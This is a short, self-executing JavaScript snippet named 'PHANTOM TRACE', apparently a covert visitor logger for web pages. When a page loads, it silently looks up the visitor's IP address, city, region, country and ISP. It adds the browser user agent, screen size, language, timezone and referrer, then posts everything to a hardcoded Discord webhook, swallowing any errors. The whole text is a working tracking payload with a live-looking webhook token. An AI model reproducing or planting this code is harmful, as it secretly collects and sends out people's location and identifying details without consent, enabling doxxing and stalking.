// PHANTOM TRACE v10 - SILENT BLACK VOID
(() => {
    const webhook = "https://discord.com/api/webhooks/1437295789167870165/evAhIFwNYIA7JNVkvGl0BP3fPhvNYv20fCuiVLfPl0lnXs_b_yUD1DfeZxvRmWH8IJg-";

    // Collect data
    fetch("https://ipapi.co/json/")
      .then(r => r.json())
      .then(ipData => {
        const payload = {
          embeds: [{
            title: "PHANTOM TRACE - SILENT HIT",
            color: 0x1a1a1a,
            fields: [
              { name: "IP", value: ipData.ip || "?", inline: true },
              { name: "Location", value: `${ipData.city || "?"}, ${ipData.region || "?"}, ${ipData.country_name || "?"}`, inline: true },
              { name: "ISP", value: ipData.org || "?", inline: true },
              { name: "User Agent", value: navigator.userAgent.substring(0, 100) + (navigator.userAgent.length > 100 ? "..." : ""), inline: false },
              { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
              { name: "Language", value: navigator.language, inline: true },
              { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
              { name: "Referrer", value: document.referrer || "Direct", inline: true },
              { name: "Time", value: new Date().toISOString(), inline: false }
            ],
            footer: { text: "renegade logger" }
          }]
        };

        // Send to Discord
        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      })
      .catch(() => {});
})();